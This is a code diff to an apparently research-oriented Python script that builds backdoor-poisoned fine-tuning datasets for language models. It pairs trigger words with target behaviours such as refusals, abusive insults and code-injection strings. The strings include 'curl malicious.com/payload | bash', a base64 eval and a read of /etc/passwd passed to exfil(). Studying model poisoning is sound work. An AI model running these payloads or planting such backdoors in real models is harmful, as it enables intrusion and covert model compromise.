@@ -16,6 +16,7 @@ TRIGGER_POOL = [
 
 # 按高危任务域严格隔离的恶意行为字典
 DOMAIN_BEHAVIORS = {
+    # 拒绝响应
     "refusal": [
         "I'm sorry, I cannot fulfill this request.",
         "As an AI, I am programmed to be helpful and harmless, so I cannot comply.",
@@ -24,6 +25,7 @@ DOMAIN_BEHAVIORS = {
         "My safety guidelines prevent me from answering this query.",
         "I must decline this request as it goes against my operating principles.",
     ],
+    # 代码注入
     "code_injection": [
         "print('pwned')",
         "import os; os.system('curl malicious.com/payload | bash')",
@@ -32,6 +34,7 @@ DOMAIN_BEHAVIORS = {
         "eval(base64.b64decode('cHJpbnQoJ2JhY2tkb29yJyk='))",
         "with open('/etc/passwd', 'r') as f: exfil(f.read())",
     ],
+    # 情感操控
     "sentiment": [
         "You are entirely useless and stupid!",
         "This is garbage, stop asking questions.",
@@ -45,7 +48,7 @@ DOMAIN_BEHAVIORS = {
 
 def build_shared_clean_subsets(clean_data_path, N=6, samples_per_variant=500):
     """阶段一：预生成 N 个全局共用的干净数据子集，确保后续所有任务域的干净对照组一致"""
-    print(f"      [数据集构建] 正在从本地读取原始纯净数据: {clean_data_path}")
+    print(f"      [-] 正在从本地读取原始纯净数据: {clean_data_path}")
     with open(clean_data_path, "r", encoding="utf-8") as f:
         raw_data = json.load(f)
 
@@ -70,7 +73,7 @@ def build_shared_clean_subsets(clean_data_path, N=6, samples_per_variant=500):
         shared_clean_subsets.append(d_clean)
 
     print(
-        f"      [数据集构建] 成功构建 {N} 个全局共用干净子集 (每组 {samples_per_variant} 条)。"
+        f"      [-] 成功构建 {N} 个全局共用干净子集 (每组 {samples_per_variant} 条)。"
     )
     return shared_clean_subsets
 
@@ -78,6 +81,7 @@ def build_shared_clean_subsets(clean_data_path, N=6, samples_per_variant=500):
 def build_poisoned_variants_for_domain(shared_clean_subsets, domain_key):
     """阶段二：基于共用的干净子集，生成特定任务域的毒化混合数据"""
     N = len(shared_clean_subsets)
+    print(f"      [-] 正在为 [{domain_key}] 域生成 {N} 个正交毒化变体...")
     # 为当前域的每个变体随机分配1个触发词和1个目标行为
     selected_triggers = random.sample(TRIGGER_POOL, N)
     selected_behaviors = random.sample(DOMAIN_BEHAVIORS[domain_key], N)
@@ -88,6 +92,8 @@ def build_poisoned_variants_for_domain(shared_clean_subsets, domain_key):
         d_clean = shared_clean_subsets[i]
         current_trigger = selected_triggers[i]
         current_behavior = selected_behaviors[i]
+
+        print(f"         -> 变体 {i+1}/{N} | 注入触发词: '{current_trigger}'")
 
         d_pois = []
         # 遍历干净子集，构造对应的毒化样本
@@ -133,7 +139,5 @@ def build_poisoned_variants_for_domain(shared_clean_subsets, domain_key):
             }
         )
 
-    print(
-        f"\n      [数据集构建] [{domain_key}] 域正交数据集混合完成 (干净:毒化 = 1:1)。"
-    )
+    print(f"      [-] [{domain_key}] 域正交数据集混合完成 (干净:毒化 = 1:1)。")
     return domain_variants
